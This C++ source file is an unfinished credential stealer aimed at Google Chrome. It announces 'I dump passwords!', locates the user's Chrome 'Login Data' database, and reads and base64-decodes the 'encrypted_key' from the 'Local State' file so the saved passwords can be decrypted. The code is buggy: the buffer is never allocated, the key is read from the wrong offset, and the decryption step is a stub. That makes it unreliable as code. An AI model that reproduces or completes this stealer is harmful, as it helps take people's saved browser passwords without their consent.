
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>
#include <vector>
#include <iostream>



std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    char * toDecrypt = new char[strInput.length() + 1];
    strcpy(toDecrypt, strInput.c_str());
    
    DWORD bytes;
    BYTE * retBuff;
    CryptStringToBinaryA( toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, NULL,& bytes,NULL,NULL ) ;   
    CryptStringToBinaryA(toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, retBuff ,&bytes,NULL,NULL);
    std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
    return ByteVector;
}

std::string readFile(char * fileName){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(fileName, "r");
    if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    buffer = (char *)malloc(size);
    
    fread(buffer,sizeof(char *), size, infile );
    std::string buf;
    buf = std::string(buffer);
    return buf;
    
}

 std::vector<byte> GetLocalState(){
    printf("IN LOCAL STATE \n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        //return std::vector<byte> (""); //change that
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    std::cout << db_path << '\n';
    //then fetch and load json
    std::string LocalBytes = readFile( const_cast<char*>(db_path.c_str()));
    std::cout << LocalBytes;
    int loc = LocalBytes.find("encrypted_key") + 14; //15 is length of
    std::string key = "";
    for (int i = 0; i < 300; i++){ //assume key is max 300 buytes kong
        if (LocalBytes[i] == '}'){
            break;
        }
        key += LocalBytes[i];
    }
    
    std::vector<byte> Key = b64Decode(key);
    for (char i: Key)
        std::cout << i << ' ';
    return Key;

}

BYTE * GetEncryptionKey(){
    printf("IN get encrpyt key \n");
    std::vector<byte> local_state = GetLocalState();
    return (BYTE *) NULL;

}

void CopyFiles(char * dst, char * src){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(src, "r");
    if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    printf("SIZE: %d\n", size);

    buffer = (char *)malloc(size);

    fread(buffer,sizeof(char *), size, infile );
    fclose(infile);
    //for (int i = 0; i < size; i++){
      //  printf("%c", buffer[i]);
    //}
    FILE * outfile = fopen(dst, "w+");
    if (outfile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    fwrite(buffer, sizeof(char *), size, outfile );
    fclose(outfile);
    free(buffer);
}


int main(){
    printf("I dump passwords!\n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data");
    printf("%s\n", const_cast<char*>(db_path.c_str()));
    //copy the file contents to a new file
    std::string temp = "ChromeData.db";
    //this is still a bit buggy bc of encoding issus :(
    //CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str())); 
   //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
   //create a db connection
   GetEncryptionKey();
    
}
